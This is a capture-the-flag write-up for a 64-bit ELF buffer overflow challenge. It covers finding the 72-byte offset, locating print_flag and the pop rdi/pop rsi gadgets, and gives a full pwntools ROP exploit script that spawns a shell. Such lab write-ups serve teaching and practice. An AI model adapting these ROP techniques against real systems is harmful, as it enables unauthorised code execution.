![alt text](bof3.png)

# Gathering Information
the challenge provides a binary,it's source code and a netcat service.
- the binary is ELF 64bit mode.
- when reading the source code, the binary reads 0x100 bytes and the size of our buffer is 60, so we have a buffer overflow vulnerability.
- we have a print_flag function that calls system("/bin/bash") only if the first argument = 0xdeadbeef and the second argument = 0xc0febabe, so we have to use gadgets to
fill the arguments with the required values.
# Exploitation
- find the size of the buffer to overwrite the saved instruction pointer RIP
- find the address of print_flag function
- find gadget addresses : pop rdi and pop rsi
- chain our payload
## Overwriting the saved return pointer address
to overwrite the saved rip, we can use PEDA to create a pattern then find the offset.
- set a breakpoint at ret instruction in main
- pattern create 200
- examine the rsp x $rsp
- pattern offset "IAAe"
we can see that the offset to the saved rip is : 72
## Address of print_flag
inside gdb : 
- p print_flag
the function is at : 0x40121f 
## Gadgets
using ropper, we can find the wanted gadgets : 
- ropper --file task7 --search "pop rdi" #0x0000000000401323
- ropper --file task7 --search "pop ret" #0x0000000000401321
## Payload
```python
from pwn import *                                                                                                                                                                                                                               p = process("./task7")                                                                                                  
poprdi = 0x401323                                                                                                       
poprsi = 0x401321                                                                                                       
print_flag = 0x40121f                                                                                                                                                                                                                           payload = b""                                                                                                           
payload += b"A"*72                                                                                                      
payload += p64(poprdi)                                                                                                  
payload += p64(0xdeadbeef)                                                                                              
payload += p64(poprsi)                                                                                                  
payload += p64(0xc0febabe)                                                                                              
payload += p64(0)                                                                                                       
payload += p64(print_flag)                                                                                             
p.sendline(payload)                                                                                                     
p.interactive()```
